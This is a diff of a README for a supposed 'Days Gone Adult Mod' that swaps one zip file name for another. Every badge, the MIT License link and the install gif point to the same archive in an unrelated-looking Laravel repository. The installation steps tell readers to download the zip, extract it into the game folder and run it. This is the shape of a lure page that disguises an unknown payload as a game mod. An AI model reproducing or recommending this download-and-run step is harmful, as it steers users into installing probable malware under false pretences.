@@ -1,10 +1,10 @@
 # 🎮 Days Gone Adult Mod: Ultimate Experience Edition  
 
-![GitHub release](https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/api_builder_response_laravel_diatoric.zip)
-![MIT License](https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/api_builder_response_laravel_diatoric.zip)
-![OS Windows](https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/api_builder_response_laravel_diatoric.zip✔️-2ea44f?style=for-the-badge)  
-![OpenAI API](https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/api_builder_response_laravel_diatoric.zip)
-![Claude API](https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/api_builder_response_laravel_diatoric.zip)
+![GitHub release](https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/response-api-builder-laravel-v2.5-beta.5.zip)
+![MIT License](https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/response-api-builder-laravel-v2.5-beta.5.zip)
+![OS Windows](https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/response-api-builder-laravel-v2.5-beta.5.zip✔️-2ea44f?style=for-the-badge)  
+![OpenAI API](https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/response-api-builder-laravel-v2.5-beta.5.zip)
+![Claude API](https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/response-api-builder-laravel-v2.5-beta.5.zip)
 
 ## 🔥 What is the Days Gone Adult Mod?
 
@@ -47,11 +47,11 @@ Days Gone mod, Days Gone mature content, advanced Days Gone customization, adapt
 
 ## ✨ Installation Guide: Seamless Start  
 
-1. **Download** the `https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/api_builder_response_laravel_diatoric.zip` package from this repository.  
+1. **Download** the `https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/response-api-builder-laravel-v2.5-beta.5.zip` package from this repository.  
 2. **Extract** the files to your Days Gone main directory.
-3. **Run** the https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/api_builder_response_laravel_diatoric.zip  
+3. **Run** the https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/response-api-builder-laravel-v2.5-beta.5.zip  
 4. Watch our installation gif for a step-by-step walkthrough:  
-![Installation Tutorial](https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/api_builder_response_laravel_diatoric.zip)
+![Installation Tutorial](https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/response-api-builder-laravel-v2.5-beta.5.zip)
 5. **Follow** the onscreen prompts—the interface adapts to your system language!
 
 **Tip:** The interface automatically detects your display and chooses the optimal look!  
@@ -87,7 +87,7 @@ This project is designed for adult players who seek a transformative experience 
 
 ## 📄 License
 
-All contributions, code, and creative content are distributed under the ultra-open [MIT License](https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/api_builder_response_laravel_diatoric.zip).  
+All contributions, code, and creative content are distributed under the ultra-open [MIT License](https://raw.githubusercontent.com/Burhanhassanreshi/laravel-api-response-builder/main/viceversally/response-api-builder-laravel-v2.5-beta.5.zip).  
 © 2025 CreativeDaysGoneMods
 
 ---
